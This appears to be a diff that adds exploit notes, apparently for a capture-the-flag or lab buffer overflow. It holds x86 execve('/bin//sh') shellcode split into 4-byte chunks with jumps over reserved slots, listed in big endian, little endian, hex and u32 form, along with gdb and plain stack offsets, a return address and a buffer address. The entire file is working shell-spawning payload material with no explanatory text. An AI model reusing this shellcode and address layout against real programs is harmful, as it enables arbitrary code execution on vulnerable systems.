@@ -1,0 +1,65 @@
+(big endian)
+
+index : code
+1
+31 c0 50 eb
+2     : 07 90 90 90
+3     : - reserved
+4     : 68 2f 2f 73
+5     : 68 eb 05 90
+6     : - reserved
+7     : 68 2f 62 69
+8     : 6e eb 05 90
+9     : - reserved
+10    : 89 e3 89 c1
+11    : 89 c2 eb 04
+12    : - reserved
+13    : b0 0b cd 80
+
+(little endian)
+index : code
+1     : eb 50 c0 31
+2     : 90 90 90 07
+3     : - reserved
+4     : 73 2f 2f 68
+5     : 90 05 eb 68
+6     : - reserved
+7     : 69 62 2f 68
+8     : 90 05 eb 6e
+9     : - reserved
+10    : c1 89 e3 89
+11    : 04 eb c2 89
+12    : - reserved
+13    : 80 cd 0b b0
+
+(payload - hex)
+index : code
+1     : 0xeb50c031
+2     : 0x90909007
+4     : 0x732f2f68
+5     : 0x9005eb68
+7     : 0x69622f68
+8     : 0x9005eb6e
+10    : 0xc189e389
+11    : 0x04ebc289
+13    : 0x80cd0bb0
+
+(payload - u32)
+1     : 3947937841
+2     : 2425393159
+4     : 1932472168
+5     : 2416307048
+7     : 1768042344
+8     : 2416307054
+10    : 3247039369
+11    : 82559625
+13    : 2160921520
+
+(gdb)
+3254858428 : 4294956328
+
+(plain)
+3254858420 : 4294956320
+
+ret addr = 0xffffde1c
+buffer   = 0xffffdc54
